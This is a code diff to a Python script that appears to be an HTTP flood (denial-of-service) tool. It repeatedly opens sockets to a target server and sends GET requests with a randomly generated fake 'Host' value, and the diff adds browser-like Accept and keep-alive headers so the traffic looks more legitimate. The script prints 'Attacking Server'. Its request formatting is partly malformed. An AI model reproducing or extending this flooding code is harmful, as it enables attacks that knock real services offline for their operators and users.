@@ -46,16 +46,14 @@ try:
         n5 = random.choice(ang)
         n6 = random.choice(ang)
         n7 = random.choice(ang)
-        n8 = random.choice(ang)
-        n9 = random.choice(ang)
-        n10 = random.choice(ang)
-        n11 = random.choice(ang)
-        fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}:{n8}{n9}{n10}{n11}"
+        fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip,port))
             s.sendto(("GET / " + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
             s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (ip,port))
+            s.sendto(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode('ascii'), (ip,port))
+            s.sendto(("Connection: keep-alive\r\n\r\n").encode('ascii'), (ip,port))
             s.close()
             print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
         except TimeoutError:
